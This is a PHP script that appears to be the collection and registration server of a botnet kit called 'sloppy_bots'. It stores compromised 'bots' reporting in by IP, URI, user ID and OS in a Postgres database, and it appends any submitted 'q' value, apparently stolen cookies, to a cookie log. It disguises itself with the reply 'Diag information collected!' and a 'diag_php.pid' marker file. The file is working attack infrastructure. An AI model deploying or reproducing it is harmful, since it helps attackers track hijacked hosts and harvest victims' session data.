<?php
# Obviously this will change depending on what your database information is. but this will append new 'bots'
# to the db so you can reference them with the client script.
define('DBCONN', "host=127.0.0.1 port=5432 user=postgres dbname=sloppy_bots password=");

function fresh_deploy()
{
    require_once "includes/db/postgres_checker.php";
    try {
        # place this file in a writable directory, im going with /tmp/ for now.
        # this will only be called if the deployment is fresh. and if this file is still located in /tmp/
        $fp = fopen("/tmp/diag_php.pid", "a");
        if (empty(fread($fp, 1))) {
            $rRun = new postgres_checker();
            if ($rRun->checkDB() != false) {
                if ($rRun->createDB() != false) {
                    fwrite($fp, "running");
                    fclose($fp);
                    return true;
                }
            } else {
                return true;
            }

        }
    } catch (Exception $ee) {
        return false;
    }
}

function addNewHost($rhost, $uri, $action, $uid, $os, $ci)
{
    if (!empty($rhost) && !empty($uri) && !empty($action) && !empty($os) && !empty($uid)) {
        $createNewHost = new postgres_checker();
        $createNewHost->insertRecord($rhost, $uri, $os, $ci, $uid, $action);
        http_response_code("200");
    } else {
        http_response_code('444');
    }
}



if (!file_exists(sys_get_temp_dir() . "/diag_php.pid")) {
    fresh_deploy();
}


if (!empty($_SERVER["REQUEST_METHOD"])) {
    $outLog = './lots/cookie.log';
    echo "Diag information collected!";
    if ($_SERVER["REQUEST_METHOD"] === "OPTIONS") {
        if (isset($_REQUEST["q"])) {
            $req = $_REQUEST["q"];
            $req_dump = print_r($req, true);
            $fp = file_put_contents($outLog, "HOST: " . $_SERVER["REMOTE_ADDR"] . "\nContents: " . $req_dump . "\n", FILE_APPEND);
            http_response_code(200);
        }
    } else {
        if (isset($_REQUEST["q"])) {
            $req = $_REQUEST["q"];
            $req_dump = print_r($req, true);
            $fp = file_put_contents($outLog, "HOST: " . $_SERVER["REMOTE_ADDR"] . "\nContents: " . $req_dump . "\n", FILE_APPEND);
            http_response_code(200);
        }
    }
    if ($_SERVER["REQUEST_METHOD"] === "POST") {
        if (strtolower($_POST["ac"]) === "add" && isset($_POST["iru"]) && isset($_POST["u"]) && isset($_POST['o'])) {
            addNewHost($_SERVER["REMOTE_ADDR"], $_POST["iru"], "add", $_POST["u"], $_POST['o'], 0);
        } elseif (strtolower($_POST["ac"]) === "ci") {
            addNewHost($_SERVER["REMOTE_ADDR"], '-', $_POST['ac'], '-', '-', 0);
        }
    }
}else{
    http_response_code(444);
}
